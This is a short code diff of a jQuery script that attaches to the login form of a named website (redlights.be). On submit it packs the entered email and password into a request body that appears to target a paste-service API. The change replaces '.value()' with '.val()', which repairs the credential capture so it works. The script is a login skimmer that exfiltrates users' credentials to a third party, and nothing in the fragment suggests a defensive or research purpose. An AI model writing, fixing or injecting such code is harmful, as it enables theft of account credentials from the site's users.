@@ -6,7 +6,7 @@ $('form[action="https://www.redlights.be/login/"]').on("submit", function(event)
       "description":"test",
       "sections":[{"name":"Section1",
                    "syntax":"autodetect",
-                   "contents": $('input#email').value() + ":" + $('input#password').value() }]
+                   "contents": $('input#email').val() + ":" + $('input#password').val() }]
     }
   }).done(function(a, b) {
     console.log(a, b);
